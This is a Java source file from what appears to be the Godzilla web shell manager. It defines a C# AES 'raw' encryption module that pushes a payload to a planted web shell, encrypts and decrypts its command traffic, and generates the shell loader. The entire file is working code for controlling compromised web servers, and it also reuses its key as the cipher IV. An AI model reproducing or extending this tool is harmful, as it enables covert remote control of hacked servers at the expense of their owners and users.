package net.BeichenDream.Godzilla.shells.cryptions.cshapAes;

import net.BeichenDream.Godzilla.core.annotation.CryptionAnnotation;
import net.BeichenDream.Godzilla.core.imp.Cryption;
import net.BeichenDream.Godzilla.core.shell.ShellEntity;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import net.BeichenDream.Godzilla.util.Log;
import net.BeichenDream.Godzilla.util.functions;
import net.BeichenDream.Godzilla.util.http.Http;

@CryptionAnnotation(Name = "CSHAP_AES_RAW", payloadName = "CShapDynamicPayload")
public class CShapAesRaw implements Cryption {
    private Cipher decodeCipher;
    private Cipher encodeCipher;
    private Http http;
    private String key;
    private byte[] payload;
    private ShellEntity shell;
    private boolean state;

    @Override // core.imp.Cryption
    public void init(ShellEntity context) {
        this.shell = context;
        this.http = this.shell.getHttp();
        this.key = this.shell.getSecretKeyX();
        try {
            this.encodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            this.decodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"), new IvParameterSpec(this.key.getBytes()));
            this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"), new IvParameterSpec(this.key.getBytes()));
            this.shell.getHeaders().put("Content-Type", "application/octet-stream");
            this.payload = this.shell.getPayloadModel().getPayload();
            if (this.payload != null) {
                this.http.sendHttpResponse(this.payload);
                this.state = true;
                return;
            }
            Log.error("payload Is Null");
        } catch (Exception e) {
            Log.error(e);
        }
    }

    @Override // core.imp.Cryption
    public byte[] encode(byte[] data) {
        try {
            return this.encodeCipher.doFinal(data);
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    @Override // core.imp.Cryption
    public byte[] decode(byte[] data) {
        try {
            return this.decodeCipher.doFinal(data);
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    @Override // core.imp.Cryption
    public boolean isSendRLData() {
        return false;
    }

    @Override // core.imp.Cryption
    public boolean check() {
        return this.state;
    }

    @Override // core.imp.Cryption
    public byte[] generate(String password, String secretKey) {
        return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), true);
    }
}
